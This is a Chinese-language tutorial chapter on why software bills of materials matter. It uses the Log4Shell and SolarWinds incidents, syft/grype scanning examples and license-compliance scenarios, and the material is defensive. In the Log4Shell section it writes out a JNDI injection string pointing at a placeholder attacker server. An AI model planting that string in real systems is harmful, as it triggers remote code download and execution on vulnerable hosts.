# Ch 1 — 為什麼需要 SBOM

> **目標**：從兩個真實事件理解 SBOM 存在的根本動機——不是合規文件、不是工具輸出，而是「出事時能不能查表」的能力差距。讀完這章，你對「SBOM 要解什麼問題」的直覺會比大部分看過簡報的人都清楚。

## 為什麼需要這個？

2021 年 12 月 9 日，一個影響 Apache Log4j 函式庫的嚴重漏洞（CVE-2021-44228，又稱 Log4Shell）被公開。這個函式庫是 Java 生態裡最普遍的 logging 工具，影響範圍之廣，CISA 將它描述為「過去十年最嚴重的漏洞之一」。

那個週末，全世界的工程師都在問同一句話：

**「我的系統裡到底有沒有 log4j？哪個版本？」**

有些人幾分鐘就知道答案。大部分人翻了三天。

這就是 SBOM（軟體物料清單，Software Bill of Materials）存在的原因——不是為了填表，是為了把這個問題從「翻舊碼考古」變成「查表」。

## 先建立直覺

兩種人，同一個問題，差距在哪裡：

```
【沒有 SBOM 的團隊】

CVE 爆了
    │
    ▼
「我們有用 log4j 嗎？」
    │
    ▼
翻 git 歷史 → 翻 pom.xml → 翻每個服務的 build log
    │
    ├── 「這個服務有 log4j 2.14.1，中了」
    ├── 「這個服務有 log4j 1.2，不確定」
    ├── 「這個服務的 log4j 是 Spring Boot 傳進來的，版本未知」
    ├── 「那個老服務沒人知道用了什麼，去問離職的那個人...」
    └── 三天後：「大概摸清楚了，但不確定有沒有漏掉什麼」

【有 SBOM 的團隊】

CVE 爆了
    │
    ▼
grep log4j my-product.spdx.json        ← 或讓 grype 比對
    │
    ▼
「log4j-core@2.14.1 在 service-A、service-C、service-F」
    │
    ▼
20 分鐘後：開始修
```

這不是假設。2021 年那個週末，CISA 的事後報告記錄了：很多組織光是清點自己到底有多少 log4j 就花了幾天。有些組織在幾個月後仍然不確定。

## 現代軟體是由你不認識的東西組成的

這是核心問題：你寫了多少你自己的程式碼？

軟體構成的現實是，現代應用程式有 80–90% 的程式碼來自第三方開源元件，剩下才是自己寫的業務邏輯。而這些第三方元件又有自己的依賴——你的直接依賴（direct dependency）背後跟著一大串傳遞依賴（transitive dependency），真正的依賴圖往往深達 5–10 層。

```
你的應用
  ├── Spring Boot 3.x             ← 直接依賴
  │     ├── logback 1.4.x         ← 傳遞依賴（你沒點名，它帶進來的）
  │     │     └── slf4j-api 2.x  ← 又一層
  │     ├── jackson-databind 2.x  ← 傳遞依賴
  │     └── ...（幾十個）
  ├── log4j 2.14.1                ← 直接依賴（某個服務的 pom.xml 寫的）
  │     └── log4j-api 2.14.1     ← 傳遞依賴
  └── ...
```

問題是：**你知道 Spring Boot 帶進來的所有傳遞依賴嗎？你知道那些傳遞依賴的版本嗎？你能在三分鐘內告訴我你的系統有沒有用某個特定版本的某個函式庫嗎？**

大多數誠實的工程師回答：不確定。

這就是「軟體供應鏈的不透明」——你在跑一堆你不完全知道是什麼的東西。SBOM 是解這個問題的工具：把「系統裡有什麼」從隱性知識變成明確的、機器可查的清單。

## 兩個事件，同一個根本問題

### SolarWinds（2020 年 12 月）

SolarWinds 的 Orion IT 監控軟體在其 build 流程中被植入後門（SUNBURST 惡意程式）。從 2020 年 10 月到 12 月，帶有後門的版本（2019.4 到 2020.2.1）被推送給約 18,000 個客戶，其中包括美國財政部、國務院、國防部等政府機構。

受害者要問的問題：「我裝的 SolarWinds Orion 是哪個版本？」這聽起來容易，但在大型企業的 IT 環境裡，同一個軟體可能裝在幾百台機器上，版本不一，加上 Orion 更新機制的複雜性，很多組織花了幾週才清點清楚。

這個案例揭示的更深問題是：**你怎麼知道你的軟體供應商給你的是你以為的東西？** SolarWinds Orion 的 binary 被修改了，但 hash 可能依然看起來正確（如果攻擊者也更新了 hash），版本號也沒有變。你需要的不只是知道「裝了哪個版本」，而是能驗證「這個版本確實是從那個 source build 出來的、中間沒有被動過」。這就是為什麼 SBOM 後來和 sigstore / in-toto / SLSA（Part 5）緊密連結——光有清單不夠，清單本身也需要被信任。

如果有部署 SBOM（Deployed SBOM，記錄系統上實際裝了什麼版本），加上 Build SBOM（記錄 artifact 是怎麼 build 出來的）和簽章驗證，這個問題的答案可以是幾分鐘，而不是幾週——並且你能確認清單本身沒有被竄改。

### Log4Shell（2021 年 12 月，CVE-2021-44228）

Log4j 的 JNDI lookup 功能存在一個遠端程式碼執行漏洞。攻擊者只要在任何會被 log4j 記錄的欄位（User-Agent、表單輸入、URL 參數）放入 `${jndi:ldap://攻擊者伺服器/payload}`，就能觸發被攻擊機器向外連線並執行任意程式碼。

問題的殺傷力不只在漏洞本身，在**廣泛性**：log4j 幾乎存在於所有 Java 生態的軟體裡，包括大量的企業內部系統。很多團隊根本不知道自己在跑它，因為它是被傳遞依賴帶進來的——不是他們自己加的，是他們用的某個框架或中介軟體帶進來的。

事後統計：漏洞公開後一週內，CISA 估計全球數億個系統暴露其中。很多組織花了數天到數週才搞清楚自己的暴露面。

**SBOM 在這個情境下的意義**：如果你有一份 alpine:3.19 的 SBOM，你可以在幾秒鐘內知道「有沒有 log4j」：

```bash
$ grep -i "log4j" my-product.spdx.json
```

沒有輸出 → 你沒有暴露。有輸出 → 你馬上知道版本和位置，直接開始修。不需要翻程式碼、問同事、考古 build log。

## 查表 vs 考古：用 grype 示範

讓這個差距具體化。我用 grype 對 alpine:3.19 的 SBOM（Ch 0 生出來的那份）做漏洞比對：

```bash
$ grype sbom:/tmp/alpine.spdx.json
```

實際輸出：

```
NAME           INSTALLED             FIXED IN              TYPE  VULNERABILITY   SEVERITY
busybox        1.36.1-r20                                  apk   CVE-2025-60876  Medium
busybox-binsh  1.36.1-r20                                  apk   CVE-2025-60876  Medium
ssl_client     1.36.1-r20                                  apk   CVE-2025-60876  Medium
musl           1.2.4_git20230717-r5  1.2.4_git20230717-r6  apk   CVE-2026-40200  High
musl-utils     1.2.4_git20230717-r5  1.2.4_git20230717-r6  apk   CVE-2026-40200  High
musl           1.2.4_git20230717-r5  1.2.4_git20230717-r6  apk   CVE-2026-6042   Medium
musl-utils     1.2.4_git20230717-r5  1.2.4_git20230717-r6  apk   CVE-2026-6042   Medium
zlib           1.3.1-r0                                    apk   CVE-2026-27171  Medium
busybox        1.36.1-r20            1.36.1-r21            apk   CVE-2025-46394  Low
busybox-binsh  1.36.1-r20            1.36.1-r21            apk   CVE-2025-46394  Low
ssl_client     1.36.1-r20            1.36.1-r21            apk   CVE-2025-46394  Low
busybox        1.36.1-r20            1.36.1-r21            apk   CVE-2024-58251  Low
busybox-binsh  1.36.1-r20            1.36.1-r21            apk   CVE-2024-58251  Low
ssl_client     1.36.1-r20            1.36.1-r21            apk   CVE-2024-58251  Low
```

這份輸出告訴我：

- **哪些 package 有已知漏洞**：musl、busybox、zlib 各有問題
- **目前裝的版本**（`INSTALLED`）是什麼
- **有沒有修好的版本**（`FIXED IN`）：musl 的 CVE-2026-40200 可以升到 r6 解決，busybox 的 CVE-2025-60876 `FIXED IN` 欄位空白代表上游還沒出修復版本

這整個過程花了幾秒鐘。同樣的分析，對一個沒有 SBOM 的系統，你要先 syft 掃一遍（幾十秒），或者手動翻依賴清單（幾分鐘到幾小時）。而對一個龐大的、幾百個服務的系統，「查表」和「考古」的差距可以是幾十倍。

> 注意：這裡展示的 CVE 是 grype 對這個特定 alpine:3.19 版本比對漏洞資料庫的真實輸出，你跑的時候 DB 可能更新、結果會不同。CVE 編號本身不重要，重要的是「機器在幾秒內告訴你」這件事。

## 底層機制：SBOM 接上哪些事

SBOM 不是孤立的文件，它是整個軟體供應鏈安全的基礎設施的入口。理解它接上什麼，你才知道「做 SBOM」的投資報酬率在哪裡：

```
         SBOM（元件清單）
              │
    ┌─────────┼──────────────┐
    ▼         ▼              ▼
  漏洞管理   授權合規      供應鏈完整性
(grype/trivy) (fossa/黑鴨子) (sigstore/in-toto/SLSA)

漏洞管理：
  CVE 爆了 → 比對 SBOM → 知道哪些系統中了 → 優先修
  → 不是「全部 Java 服務都升一遍」，是「只修確認有 log4j 的那幾個」

授權合規：
  SBOM 裡的每個 component 都有 license 資訊
  → 你有沒有在閉源商業軟體裡用了 GPL 的元件？（出事的話是法律問題）
  → 採購 / 法務可以審 SBOM 而不需要讀程式碼

供應鏈完整性：
  你收到的 SBOM 是真的嗎？有沒有被竄改？
  → 用 cosign 簽章 + sigstore 的 Rekor 透明日誌驗證
  → 這份 SBOM 確實是由這個 CI pipeline 在這個時間點產出的
```

這三件事對應這門課的 Part 4、Part 2（授權）、Part 5，這章只是讓你知道「SBOM 不是一個孤立的清單，它是三條線的共同基礎」。

## 授權合規：另一個「查表」的場景

漏洞管理是 SBOM 最緊迫的應用，但授權合規（license compliance）是很多公司更直接感受到的日常需求。

問題：你的商業閉源產品裡，有沒有包含 GPL 授權的函式庫？

GPL（GNU General Public License）的 copyleft 條款要求：如果你的軟體分發時包含 GPL 元件，你必須在相同條款下開放你整個軟體的原始碼。對閉源商業軟體來說，這是一個法律地雷。

沒有 SBOM 的世界：
- 法律部門找工程師逐一詢問每個依賴的 license
- 工程師翻 package.json / pom.xml 再逐一查各 package 的 license
- 傳遞依賴的 license 幾乎不可能人工追完
- 每次版本更新都要重做這個過程

有 SBOM 的世界：
- SBOM 裡的每個 component 都有 `licenseConcluded` 或 `licenseDeclared` 欄位
- 自動化工具（FOSSA、Black Duck、SBOM 本身的 license 欄位）掃出所有 GPL / LGPL / AGPL 元件
- 法務拿到 report，決定是換掉那個元件還是採取其他合規措施

這個應用不需要等到出事，它是每次 release 都應該做的例行作業。有了 SBOM，這個作業從「幾天的人工」變成「幾分鐘的自動化」。Ch 8 會把 license 資訊在 SBOM 裡的表達方式詳細展開。

## 對比與取捨

有些人把 SBOM 當萬靈丹，有些人說它沒用——兩種都是錯的。

| 維度 | SBOM 解決了什麼 | SBOM 解決不了什麼 |
|------|----------------|------------------|
| 可見性 | 讓你知道「系統裡有哪些元件」 | 不告訴你元件有沒有被惡意修改 |
| 漏洞回應 | 把「找哪些系統受影響」從幾天壓到幾分鐘 | 不幫你修漏洞、不決定要不要升版 |
| 授權 | 機器可查，不用人工審程式碼 | 你還是要理解每個授權的法律含義 |
| 信任 | 有簽章的 SBOM 能驗來源 | 生成 SBOM 的工具本身可能有盲點（Ch 12） |
| 供應鏈 | 把「我的供應商有什麼」變成可查 | 供應商提供假 SBOM 你無法靠 SBOM 本身偵測 |
| 合規 | EO 14028、EU CRA 要求的東西 | 合規 ≠ 安全，有 SBOM 不代表沒風險 |

Ch 29 會更系統地潑冷水——這個領域有很多過度樂觀的聲音，也有真實的工具盲點和流程問題。這章只講「為什麼值得做」，不代表「做了就沒事」。

## 踩雷集錦

**1. 「我知道我的直接依賴，所以我知道我在跑什麼」**

不對。直接依賴只是你顯式宣告的那層。Maven 的傳遞依賴、npm 的 hoisting、Go 的 module graph，很多真正危險的東西在第三層第四層。Log4Shell 爆發後，很多被打到的系統的開發者說「我沒有用 log4j」——但他們用的某個框架帶進來了。

**2. 「我的 CI 跑 `npm audit` / `pip-audit`，等於有了 SBOM 的效果」**

`npm audit` 比對的是你的 lock file 對已知漏洞，跟 SBOM 的定位不一樣。SBOM 是一份可轉移的、機器可讀的、描述「這個 artifact 裡有什麼元件」的清單，可以被別人消費、可以被簽章、可以在 Dependency-Track 裡長期追蹤。`npm audit` 是一個當下的點查，沒有可轉移性，不是 SBOM。

**3. 「SBOM 只有大公司才需要做」**

US EO 14028 要求賣軟體給聯邦政府的供應商提供 SBOM；EU Cyber Resilience Act（CRA）要求在歐盟銷售的數位產品製造商管理 SBOM；FDA 要求醫療設備的 SBOM 提交。如果你的軟體任何時候會接觸這些場景，「我太小了不需要」這個預設是危險的。

**4. 「有 SBOM 就安全了」**

SBOM 是資訊層，不是防護層。一份完整、準確的 SBOM 告訴你系統裡有哪些元件，讓你能快速找出受影響的系統、做授權合規審查、驗證供應鏈完整性。但它不阻止漏洞被利用，不替你修程式，不能讓你免於被攻擊。

## 進階：再往深一層

**供應鏈攻擊的演化**：SolarWinds 是在 build 流程中注入惡意程式碼（所謂的 build-time compromise）。更近的攻擊（2024-2025）開始針對 CI/CD 系統本身（pipeline poisoning）。SBOM 在這個攻擊面的作用不是「防止被攻擊」，而是「出事後加速調查」——你能從 SBOM 知道被污染的版本範圍、被影響的 artifact 有哪些（Ch 28 的 DFIR 主題）。

**EO 14028 的背景**：2021 年 5 月，美國拜登政府簽署第 14028 號行政命令《改善國家網路安全》。這份命令直接點名 SBOM，要求 NTIA 在 60 天內發布 SBOM 的最小要素，並要求賣軟體給聯邦政府的廠商提供 SBOM。Log4Shell 在這份命令簽署後六個月爆發——時機讓政府機構直接感受到「如果當時有 SBOM 會怎樣」，推動了後續更強的要求。Ch 24 會展開法規全貌。

**SBOM 的速度測試**：如果你今天對你的主要服務跑 `syft <image> -o spdx-json=sbom.json`，再用 `grep -i "某個漏洞的 package 名稱" sbom.json`，你能在幾秒內回答「這個系統有沒有這個元件」。現在就試：下次看到新的 CVE，第一件事是對你的系統 SBOM 做 grep，而不是去問同事。

**SBOM 的數量感**：一個典型的 Alpine-based container image 有 15-30 個 apk package；一個 Debian-based 的 image 動輒 200-400 個 deb package；一個 Java microservice image 加上 JVM 和 Spring Boot 的傳遞依賴，可能超過 300 個元件。一個大型的企業平台，幾十個 service 加總，元件清單可能是幾萬個 entry。要在 CVE 爆發的緊急情況下手動翻這個規模的依賴，根本不可能——這就是 SBOM 必須是**機器可讀的結構化格式**（SPDX JSON / CycloneDX JSON）而不是 PDF 或 Excel 的原因。

**「考古」的真實成本**：SBOM 工具廠商（如 Anchore）的問卷觀察一致指出，Log4Shell 期間沒有 SBOM 的組織要花上數天才能確認所有受影響的系統，有 SBOM 的能壓到數小時甚至更短。這類數字來自工具廠商自己的調查，別當成精確定論，但「數天 vs 數小時」這個量級差距在多數事後復盤裡是一致的。把它乘上一個工程團隊的規模，就是幾十到上百人天的緊急動員——SBOM 計畫的建立成本，通常遠低於一次大型事件的應變成本。這不是替 SBOM 過度美化，是實際的風險計算。

## 「SBOM 文化」vs 工具跑一遍

一個常見的誤解是「部署 SBOM 等於跑一次 syft」。工具是手段，不是目的。真正的 SBOM 計畫需要一個流程：

```
誰負責生成？      → 通常是 CI/CD pipeline（每次 build 自動產）
SBOM 存在哪裡？   → artifact registry（和 binary 綁在一起）或 S3/GCS
誰來更新？        → 每次 release 更新，新的 CVE 爆發時可以重掃
誰來消費？        → 安全團隊（漏洞比對）、法務（授權合規）、DevOps（patch 排程）
結果存哪裡？      → Dependency-Track 這類持續監控平台
```

這個流程不存在的話，SBOM 就只是一份文件，在某個目錄裡積灰。SBOM 的價值來自它被**持續生成、持續消費**——而不是出事了才跑一次。

這門課的整體結構就是這個流程的完整落地：Part 3（怎麼生成）→ Part 4（怎麼消費）→ Part 5（怎麼信任）→ Part 6（怎麼治理）。這章只是入口：先理解為什麼值得做。

## 動手練習

1. 打開一個你實際在用的 container image（或用 alpine:3.19 練習），用 `syft <image> -o spdx-json=my.sbom.json` 生一份 SBOM，然後用 `grep -i openssl my.sbom.json` 看有沒有。接著查 NVD（nvd.nist.gov）找最近 openssl 的 CVE，看你的版本是否在受影響範圍。這就是 Log4Shell 那個週末有 SBOM 的人做的事。

2. 用 `grype sbom:/tmp/alpine.spdx.json` 對你 Ch 0 生出來的 alpine SBOM 掃一遍，把輸出的 `FIXED IN` 為空的 CVE 記下來——那些是「你現在能做的事情只有等」的漏洞，是優先順序評估的重要資訊。

3. 找一個有 Java 依賴的 Maven 或 Gradle 專案（GitHub 上任找），克隆下來，用 `syft dir:. -o spdx-json=proj.sbom.json` 掃目錄（能認出 pom.xml / build.gradle 裡的依賴），看傳遞依賴深到幾層。

## 本章重點整理

- SBOM 存在的根本動機是**可見性**：在現代軟體 80–90% 是第三方依賴的前提下，你需要一份清單告訴你「系統裡有什麼」。
- Log4Shell 和 SolarWinds 是兩個最具代表性的案例，說明「查表 vs 考古」的差距有多大。
- SBOM 是三件事的共同基礎：漏洞管理、授權合規、供應鏈完整性。
- SBOM 不是萬靈丹——它是資訊層，不是防護層。做了不代表安全，但不做讓「出事時快速回應」成為不可能。

## 自我檢核

- [ ] 我能用自己的話解釋為什麼 Log4Shell 讓很多組織花了好幾天才知道自己有沒有受影響
- [ ] 我知道「直接依賴」和「傳遞依賴」的差別，以及為什麼傳遞依賴讓可見性問題變嚴重
- [ ] 我能說出 SBOM 接上的三件事（漏洞管理、授權合規、供應鏈完整性），以及每件事的具體好處
- [ ] 我理解「`npm audit` 不等於 SBOM」的原因
- [ ] 我知道 SBOM 解決不了什麼（它是資訊層，不是防護層）
- [ ] 我在自己的環境跑過 `grype sbom:` 並看懂了 `FIXED IN` 欄位空白代表什麼

## 延伸閱讀

- **[NTIA「The Minimum Elements for a Software Bill of Materials」（2021）](https://www.ntia.gov/report/2021/minimum-elements-software-bill-materials-sbom)**（NTIA 官方）
  - **讀哪裡**：Executive Summary 和 Section 2（Data Fields）——這是 SBOM 的美國官方定義基準，Ch 3 會深入，這裡先知道它在哪
  - **和本章的關聯**：EO 14028 引發的官方文件，「SBOM 最少要有什麼」的法律源頭

- **[CISA Log4j CVE-2021-44228 漏洞指南](https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance)**（CISA）
  - **讀哪裡**：事件時間軸和「為什麼難以清點」的分析段落
  - **和本章的關聯**：這章的核心案例，第一手資料比任何二手分析都值得讀

- **[CISA 供應鏈風險管理（SCRM）資源](https://www.cisa.gov/supply-chain)**（CISA）
  - **讀哪裡**：首頁的「What is SCRM」定義，讓你知道 SBOM 在更大的供應鏈安全框架裡的位置
  - **和本章的關聯**：把這章的「為什麼」放進更大的 ICT 供應鏈安全語境

- **[CISA「Types of Software Bill of Materials」（2023）](https://www.cisa.gov/resources-tools/resources/types-software-bill-materials-sbom)**（CISA）
  - **讀哪裡**：六型 SBOM 的官方定義——雖然 Ch 3 才會詳細展開，但現在讀能讓你理解「哪種 SBOM 能回答 SolarWinds 那種問題、哪種能回答 Log4Shell 那種問題」
  - **和本章的關聯**：兩個案例對應不同型別的 SBOM 需求

下一章我們退一步，把 SBOM 的資料模型弄清楚：它到底是什麼結構、一個「元件」包含哪些資訊、dependency graph 為什麼是圖而不是列表。

→ [Ch 2 SBOM 的本質：從製造業 BOM 到 dependency graph](./02-what-is-sbom.md)
